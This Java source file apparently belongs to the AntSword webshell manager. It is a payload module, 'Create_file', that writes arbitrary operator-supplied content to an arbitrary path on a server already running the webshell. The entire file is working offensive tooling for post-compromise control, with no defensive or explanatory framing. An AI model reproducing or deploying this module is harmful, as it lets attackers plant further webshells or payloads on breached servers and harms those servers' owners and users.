package filemanager;

import antSword.Template;

import java.io.File;
import java.io.FileOutputStream;

public class Create_file extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        String z2 = getParam("antswordargcontent");
        return WriteFileCode(z1, z2);

    }

    String WriteFileCode(String filePath, String fileContext) throws Exception {
        String h = "0123456789ABCDEF";
        String fileHexContext = strtohexstr(fileContext);
        File f = new File(filePath);
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < fileHexContext.length(); i += 2) {
            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
        }
        os.close();
        return "1";
    }

    String strtohexstr(String fileContext) throws Exception {
        String h = "0123456789ABCDEF";
        byte[] bytes = fileContext.getBytes(cs);
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (int i = 0; i < bytes.length; i++) {
            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        return sb.toString();
    }
}
